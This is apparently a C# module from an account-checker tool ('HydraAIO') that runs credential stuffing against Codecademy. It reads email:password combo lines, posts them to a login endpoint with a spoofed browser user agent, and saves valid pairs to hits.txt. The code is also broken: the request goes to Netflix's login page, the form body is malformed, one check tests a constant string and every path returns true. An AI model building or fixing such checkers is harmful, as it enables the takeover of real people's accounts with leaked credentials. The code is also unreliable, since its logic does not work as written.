using HydraAIO.Hydro;
using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace HydraAIO.Modules
{
    internal class codecademymodule
    {
        public static bool checkcodecademy(string combo)
        {
            using (HttpRequest httpRequest = new HttpRequest())
            {
                string email = combo.Split(':')[0];
                string password = combo.Split(':')[1];

                string data = "email=" + email + "password=" + password;

                CookieContainer cc = new CookieContainer();
                var request2 = (HttpWebRequest)HttpWebRequest.Create("https://www.netflix.com/al/login");

                var postdata = Encoding.ASCII.GetBytes(data);
                request2.Method = "POST";
                request2.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36";
                request2.ContentType = "application/x-www-form-urlencoded";

                request2.ContentLength = data.Length;

                using (var stream = request2.GetRequestStream())
                {
                    stream.Write(postdata, 0, data.Length);
                }
                var response = (HttpWebResponse)request2.GetResponse();

                string html = new StreamReader(response.GetResponseStream()).ReadToEnd();
                string api = "https://www.codecademy.com/login";

                if (api.Contains("Search for a Topic"))
                {
                    ++Program.hits;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    Export.AsResult("/hits.txt", combo);
                    return true;
                }
                if (html.Contains("https://www.codecademy.com/welcome/find-a-course/search"))
                {
                    ++Program.hits;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    Export.AsResult("/hits.txt", combo);
                    return true;
                }
                if (html.Contains("What would you like to learn?"))
                {
                    ++Program.hits;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    Export.AsResult("/hits.txt", combo);
                    return true;
                }
                else
                {
                    ++Program.bad;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[-] Bad - " + combo, Color.Red);
                    return true;
                }
            }
        }
    }
}
